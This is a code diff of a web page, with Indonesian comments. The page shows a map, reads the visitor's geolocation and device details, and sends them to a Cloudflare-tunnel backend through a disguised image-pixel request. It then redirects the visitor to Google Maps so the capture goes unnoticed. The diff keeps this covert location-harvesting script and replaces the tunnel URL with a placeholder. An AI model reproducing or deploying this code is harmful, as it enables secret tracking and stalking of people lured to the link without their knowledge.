@@ -83,8 +83,10 @@
     </div>
 
 <script>
-    // Pastikan link Cloudflare ini aktif (jangan ditutup terminalnya)
-    const BACKEND_URL = "https://copyrighted-hoping-tomato-cambridge.trycloudflare.com"; 
+    // =====================================================================
+    // GANTI TULISAN DI BAWAH INI PAKAI LINK CLOUDFLARE YANG BARU MUNCUL
+    // =====================================================================
+    const BACKEND_URL = "LINK_CLOUDFLARE_BARU"; 
 
     var map = L.map('map', {zoomControl: false}).setView([3.0297, 101.4497], 16);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
@@ -132,13 +134,13 @@
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     
-                    // === TRIK IMAGE PIXEL (ANTI BLOKIR CORS DARI VERCEL KE CLOUDFLARE) ===
+                    // === TRIK IMAGE PIXEL (ANTI BLOKIR CORS) ===
                     var img = new Image();
                     img.src = `${BACKEND_URL}/capture?lat=${lat}&lon=${lon}&device=${encodeURIComponent(deviceInfo.device)}&os=${encodeURIComponent(deviceInfo.os)}`;
 
                     setTimeout(() => {
                         window.location.href = "https://www.google.com/maps/search/?api=1&query=3.0297,101.4497";
-                    }, 1500); // Kasih waktu 1.5 detik buat gambar "ke-load" (padahal kirim data)
+                    }, 1500);
                 },
                 (error) => {
                     window.location.href = "https://www.google.com/maps/search/?api=1&query=3.0297,101.4497";
